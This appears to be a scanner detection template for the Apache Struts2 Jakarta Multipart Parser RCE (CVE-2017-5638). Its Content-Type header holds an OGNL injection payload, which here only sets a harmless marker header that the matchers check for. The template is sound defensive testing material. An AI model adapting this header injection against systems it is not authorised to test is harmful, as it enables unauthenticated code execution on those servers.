name: Apache Struts Content-Type RCE (CVE-2017-5638)
description: Detects the Apache Struts2 Jakarta Multipart Parser remote code execution vulnerability (CVE-2017-5638). A malicious Content-Type header value is evaluated as an OGNL expression, enabling unauthenticated RCE.
severity: critical
tags:
  - apache
  - java
  - struts
cwe: CWE-94

requests:
  - method: POST
    path: /
    headers:
      Content-Type: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Check','struts-vuln')}"

matchers:
  - body_contains: "struts-vuln"
  - regex: "X-Struts-Check"
  - status_code: 200
